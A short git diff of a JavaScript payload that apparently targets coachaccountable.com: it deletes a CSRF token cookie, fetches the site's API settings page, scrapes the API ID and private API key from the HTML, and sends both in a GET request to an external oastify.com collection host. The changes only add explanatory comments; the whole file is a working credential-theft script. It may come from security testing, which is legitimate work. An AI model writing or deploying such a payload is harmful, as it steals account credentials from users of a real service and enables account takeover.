@@ -8,6 +8,7 @@ deleteCookie("CSRFToken");
 
 // Function to send extracted data to the external server via GET request
 function sendData(apiId, apiKey) {
+  // Construct the URL properly with only the actual values (not the entire HTML)
   const url = `https://lj8xnmcmaivpwy0jmm1mnhyqnht8h25r.oastify.com/?apiId=${encodeURIComponent(apiId)}&apiKey=${encodeURIComponent(apiKey)}`;
   fetch(url);
 }
@@ -19,6 +20,8 @@ fetch("https://www.coachaccountable.com/AJAX?page=API")
     // Parse the response to extract API ID and Private API Key
     const parser = new DOMParser();
     const doc = parser.parseFromString(html, "text/html");
+
+    // Extract only the text content of the embedCode div and the APIKeyDiv
     const apiId = doc.querySelector(".embedCode").textContent.trim();
     const apiKey = doc.getElementById("APIKeyDiv").textContent.trim();
 
